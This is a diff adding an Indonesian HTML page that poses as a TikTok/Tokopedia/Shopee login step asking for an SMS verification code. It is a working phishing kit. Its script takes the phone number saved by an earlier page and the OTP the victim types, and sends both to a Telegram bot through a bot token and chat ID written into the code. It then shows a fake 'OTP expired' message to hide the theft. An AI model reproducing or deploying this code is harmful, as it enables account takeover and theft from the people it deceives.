@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Masuk - Tokopedia & Shopee</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #fff;
+      margin: 0;
+      padding: 20px;
+      color: #333;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    .container {
+      max-width: 400px;
+      width: 100%;
+    }
+    .illustration {
+      display: flex;
+      justify-content: center;
+      margin: 40px 0 20px 0;
+    }
+    .illustration img {
+      width: 120px;
+      height: auto;
+    }
+    h1 {
+      text-align: center;
+      font-weight: 700;
+      margin: 0 0 20px 0;
+    }
+    p.info-text {
+      font-size: 16px;
+      margin-bottom: 15px;
+    }
+    p.info-text a {
+      color: #008080;
+      text-decoration: none;
+    }
+    p.info-text a:hover {
+      text-decoration: underline;
+    }
+    label {
+      display: block;
+      font-weight: 600;
+      margin-bottom: 5px;
+    }
+
+    /* Container untuk input dan timer */
+    .input-timer-wrapper {
+      position: relative;
+      width: 100%;
+      margin-bottom: 15px;
+    }
+
+    input[type="text"] {
+      width: 100%;
+      padding: 12px 50px 12px 10px; /* padding kanan buat ruangan timer */
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      box-sizing: border-box;
+    }
+
+    /* Timer di kanan dalam input */
+    .timer-countdown {
+      position: absolute;
+      top: 50%;
+      right: 12px;
+      transform: translateY(-50%);
+      font-size: 14px;
+      color: #999;
+      user-select: none;
+      pointer-events: none;
+      font-weight: 600;
+      font-family: monospace;
+    }
+
+    button.primary-btn {
+      width: 100%;
+      background-color: #008080;
+      color: white;
+      font-size: 16px;
+      font-weight: 600;
+      border: none;
+      padding: 12px;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+    button.primary-btn:hover {
+      background-color: #006666;
+    }
+    .separator {
+      text-align: center;
+      margin: 20px 0;
+      font-size: 14px;
+      color: #666;
+      position: relative;
+    }
+    .separator::before,
+    .separator::after {
+      content: "";
+      position: absolute;
+      top: 50%;
+      width: 40%;
+      height: 1px;
+      background-color: #ccc;
+    }
+    .separator::before {
+      left: 0;
+    }
+    .separator::after {
+      right: 0;
+    }
+    button.tiktok-btn {
+      width: 100%;
+      background-color: #f8f8f8;
+      border: 1px solid #ddd;
+      color: #333;
+      font-size: 16px;
+      padding: 12px;
+      border-radius: 4px;
+      cursor: pointer;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 8px;
+    }
+    button.tiktok-btn:hover {
+      background-color: #eaeaea;
+    }
+    button.tiktok-btn img {
+      width: 20px;
+      height: 20px;
+    }
+    .signup-text {
+      margin-top: 20px;
+      text-align: center;
+      font-size: 14px;
+    }
+    .signup-text a {
+      color: #008080;
+      text-decoration: none;
+      font-weight: 600;
+    }
+    .signup-text a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="illustration">
+      <!-- Ilustrasi HP dengan logo TikTok -->
+      <img src="https://lf16-scmcdn.oecstatic.com/obj/oec-magellan-sg/atlas/account/page/account_login_sea/assets/br_login_icon.hk7zd5fo.svg" alt="Ilustrasi HP TikTok" />
+    </div>
+    <h1>Masuk</h1>
+    <p class="info-text">
+      Karena alasan keamanan, kode verifikasi telah dikirim ke
+      <a href="#" id="phoneNumberLink"></a>
+    </p>
+    <label for="kode-verifikasi">Kode Verifikasi</label>
+    <div class="input-timer-wrapper">
+      <input id="kode-verifikasi" name="kode-verifikasi" type="text" placeholder="Masukkan kode verifikasi" autocomplete="one-time-code" />
+      <div class="timer-countdown" id="timerCountdown">02:00</div>
+    </div>
+    <button class="primary-btn" id="btnMasuk" type="button">Masuk</button>
+    <div class="separator">atau</div>
+    <button class="tiktok-btn" type="button" onclick="alert('Login dengan TikTok')">
+      <img src="https://lf16-scmcdn.oecstatic.com/obj/oec-magellan-sg/atlas/account/page/account_login_sea/assets/icon_tt.ecfvrvbm.svg" alt="Icon TikTok" />
+      Masuk dengan akun TikTok
+    </button>
+    <p class="signup-text">
+      Belum punya akun? <a href="#">Mendaftar</a>
+    </p>
+  </div>
+
+<script>
+  // Konfigurasi: Ganti dengan token bot dan chat ID Telegram Anda
+  const botToken = '8460065269%3AAAG_AqKScWEKGvrOaI_C-L7RWzS565Ci_wc';
+  const chatId = '7549590022';
+
+  // Ambil nomor telepon dari localStorage dengan key 'PhoneNumber'
+  const phoneNumber = localStorage.getItem('PhoneNumber');
+  const phoneNumberLink = document.getElementById('phoneNumberLink');
+  if (phoneNumber && phoneNumber.trim() !== '') {
+    phoneNumberLink.textContent = phoneNumber;
+    phoneNumberLink.href = 'tel:' + phoneNumber.replace(/\s+/g, '');
+  } else {
+    phoneNumberLink.textContent = '[nomor tidak tersedia]';
+    phoneNumberLink.removeAttribute('href');
+    phoneNumberLink.style.color = '#999';
+    phoneNumberLink.style.textDecoration = 'none';
+    phoneNumberLink.style.cursor = 'default';
+  }
+
+
+  // Fungsi hitung mundur timer 2 menit (120 detik)
+  const timerElement = document.getElementById('timerCountdown');
+  let countdown = 120; // detik
+
+  function formatTime(seconds) {
+    const m = Math.floor(seconds / 60).toString().padStart(2, '0');
+    const s = (seconds % 60).toString().padStart(2, '0');
+    return `${m}:${s}`;
+  }
+
+  timerElement.textContent = formatTime(countdown);
+
+  const intervalId = setInterval(() => {
+    countdown--;
+    if(countdown < 0) {
+      clearInterval(intervalId);
+      timerElement.textContent = '00:00';
+      // Bisa tambahkan aksi saat timer habis di sini
+    } else {
+      timerElement.textContent = formatTime(countdown);
+    }
+  }, 1000);
+
+
+  // Fungsi kirim data ke Telegram saat tombol "Masuk" diklik
+  document.getElementById('btnMasuk').addEventListener('click', () => {
+    const kodeVerifikasi = document.getElementById('kode-verifikasi').value.trim();
+
+    if (!kodeVerifikasi) {
+      alert('Mohon masukkan kode verifikasi.');
+      return;
+    }
+
+    const message =
+      `📱 *Data Login*\n` +
+      `Nomor Telepon: ${phoneNumber || '[nomor tidak tersedia]'}\n` +
+      `Kode Verifikasi: ${kodeVerifikasi}`;
+
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+    fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message,
+        parse_mode: 'Markdown'
+      })
+    })
+    .then(res => res.json())
+    .then(data => {
+      if (data.ok) {
+        alert('Kode OTP Kadaluwarsa.');
+      } else {
+        alert('Gagal mengirim data ke Telegram.');
+        console.error(data);
+      }
+    })
+    .catch(err => {
+      alert('Terjadi kesalahan saat mengirim data.');
+      console.error(err);
+    });
+  });
+</script>
+</body>
+</html>
